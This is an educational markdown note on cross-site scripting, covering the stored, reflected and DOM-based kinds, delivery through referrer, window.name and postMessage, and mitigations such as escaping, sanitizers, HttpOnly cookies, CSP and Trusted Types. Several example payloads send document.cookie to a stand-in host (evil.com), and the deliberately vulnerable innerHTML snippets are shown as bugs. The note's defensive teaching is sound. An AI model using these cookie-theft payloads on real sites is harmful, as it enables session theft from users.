# Cross-Site Scripting (XSS)

The attacker gets **their JavaScript to execute in your page, in your
origin**. Once it runs, it has everything the real page has: your cookies
(unless `HttpOnly`), your DOM, `localStorage`, and the ability to call your
APIs as the logged-in user — no password needed.

## The three flavors

| Type | Where the payload lives | Trigger |
| --- | --- | --- |
| **Stored** | saved server-side (a DB comment, a profile bio) | every visitor who views that page runs it |
| **Reflected** | the URL/query string, bounced back into the response | victim has to click a crafted link |
| **DOM-based** | never touches the server; client JS reads attacker input and writes it into the DOM | a client-side sink, e.g. `location.hash` → `innerHTML` |

```js
// stored — a comment field rendered without escaping
<div>{{ comment.body }}</div>
// comment.body = "<script>fetch('https://evil.com?c='+document.cookie)</script>"

// reflected — search page echoes the query
res.send(`<h1>Results for ${req.query.q}</h1>`);
// /search?q=<script>...</script>

// DOM-based — pure client-side, server never sees the payload
document.getElementById("out").innerHTML = location.hash.slice(1);
// site.com/#<img src=x onerror=alert(document.cookie)>
```

**Vulnerable code vs. delivery, for reflected XSS**: the search snippet above
only shows the bug — the server will echo back whatever `q` is, unescaped.
It says nothing about who sends that request. For the attack to land, the
payload has to run in the *victim's* browser, with the *victim's* session —
so the attacker can't just submit it themselves. Since nothing is stored
server-side, the attacker has to re-deliver the full payload (baked into the
URL) to each victim individually, which in practice means getting them to
open it: a phishing link, a chat message, a hidden auto-redirect on another
page. That's the "victim has to click a crafted link" trigger from the table
— the search box is the sink, the crafted link is what gets a chosen payload
through that sink using someone else's session. Contrast with stored XSS:
the attacker submits the payload once, it sits in the DB, and every later
visitor is hit for free.

**How DOM-based XSS actually works**: the server is never part of the
vulnerability. `location.hash` is the part of the URL after `#`, and the
browser never sends the fragment to the server — so unlike reflected XSS,
the HTTP response is completely clean; there's no injection point in any
request/response at all. The bug is entirely in the client-side JS: it reads
an untrusted value (a **source** — here `location.hash`) and writes it into
the DOM through a dangerous API (a **sink** — here `innerHTML`). Because
`innerHTML` parses its string as HTML, `<img src=x onerror=alert(document.cookie)>`
becomes a real DOM element; the browser fails to load `x` as an image and
fires `onerror`, running the attacker's JS in the page's own origin. Other
common source → sink pairs: `document.URL` / `document.referrer` /
`window.name` → `innerHTML`/`document.write`; `location.search` → `eval()`
or `innerHTML`; `postMessage` data → `innerHTML` without checking
`event.origin`.

**How it gets delivered**: delivery splits by which source the vulnerable
code reads.

- For sources that aren't part of the URL, delivery is indirect — the
  attacker plants the payload on a *different* origin and lets ambient
  browser behavior carry it over:
  - `document.referrer`: when you navigate from page A to page B via a
    link, the browser tells B where you came from — page A's *full URL*,
    query string included — via the `Referer` header and `document.referrer`.
    The attacker hosts a page carrying the payload in its own query string
    and puts an ordinary-looking link to the target on it:

    ```html
    <!-- hosted at https://evil.com/?<script>fetch('https://evil.com?c='+document.cookie)</script> -->
    <a href="https://vulnerable-site.com/dashboard">Click here for a free prize</a>
    ```

    The victim clicks the link, and on `vulnerable-site.com`:

    ```js
    document.referrer === "https://evil.com/?<script>fetch('https://evil.com?c='+document.cookie)</script>"
    ```

    None of this matters unless the vulnerable site's own JS reads that
    value into a dangerous sink, e.g.:

    ```js
    document.getElementById("came-from").innerHTML = "You arrived from: " + document.referrer;
    ```

    at which point the injected `<script>` executes on the vulnerable
    site's origin — even though its server never received or reflected
    anything malicious. The payload never touches the vulnerable site's own
    URL; it rides over as a side effect of the click, hidden in the page the
    victim clicked *from* rather than the one they clicked *to*. A strict
    `Referrer-Policy` (e.g. `strict-origin-when-cross-origin`) trims the
    referrer to just the origin on cross-origin navigations, which kills
    this specific vector.
  - `window.name`: it persists across navigations in the same tab. The
    attacker's page sets `window.name` to the payload, then redirects the
    tab to the vulnerable site, which reads `window.name` straight into
    `innerHTML`.
  - `postMessage`: the attacker embeds the vulnerable page in an iframe (or
    opens it as a popup) and calls `targetWindow.postMessage(payload, "*")`.
    If the vulnerable page's `message` listener writes `event.data` into the
    DOM without checking `event.origin`, it fires.

  In every indirect case, delivery is "get the victim to open the
  attacker's page first" rather than "get them to click a link to the
  target directly."

## Mitigations

- **Escape on output, not input.** The same rule from
  [request-validation.md](request-validation.md) §6 applies here directly:
  store the real text, escape when it's about to become HTML. React,
  Vue, and every modern template engine escape interpolated values by
  default — the danger is the explicit escape hatches:

  ```jsx
  <div>{comment.body}</div>                      // ✅ escaped automatically
  <div dangerouslySetInnerHTML={{ __html: comment.body }} /> // ❌ raw HTML
  ```

  Same idea in the DOM directly: prefer `textContent`/`innerText` over
  `innerHTML` (see [innerText-vs-textContent.md](../dom/1.%20innerText-vs-textContent.md)
  and [innerHtml.md](../dom/2.%20innerHtml.md)) whenever the value is
  untrusted.

- **Sanitize when users legitimately submit rich text** — an allowlist
  sanitizer, never a denylist:

  ```js
  const sanitizeHtml = require("sanitize-html");
  const clean = sanitizeHtml(dirty, {
    allowedTags: ["b", "i", "em", "strong", "a", "p", "ul", "li"],
    allowedAttributes: { a: ["href"] },
  });
  ```

- **`HttpOnly` cookies.** Marks a cookie invisible to `document.cookie`, so
  even a successful XSS can't read the session token directly (it can
  still act *through* the page, e.g. call your APIs — this limits the
  blast radius, it doesn't eliminate it).

  ```
  Set-Cookie: sid=abc123; HttpOnly; Secure; SameSite=Lax
  ```

- **Content Security Policy (CSP).** Tells the browser which places it may
  load and run scripts from, so even an injected `<script>` tag simply
  won't run:

  ```
  Content-Security-Policy: script-src 'self' https://cdn.example.com; object-src 'none'
  ```

  Avoid `'unsafe-inline'` — it's the escape hatch that defeats the whole
  point. Use nonces (`script-src 'nonce-<random-per-request>'`) if you
  must inline a script. Full details in [csp.md](csp.md).

- **Trusted Types** (Chromium) go one step further: they make `innerHTML`,
  `eval`-like sinks, etc. throw unless the value passed through a policy
  you defined — turning DOM XSS into a build-time/lint-time error instead
  of a runtime one.

- **Never build HTML by string concatenation** on the server
  (`` `<h1>${req.query.q}</h1>` ``) — use a templating engine that escapes
  by default, or a framework that does.

---

See [csrf.md](csrf.md) for CSRF and [clickjacking.md](clickjacking.md) for
clickjacking.
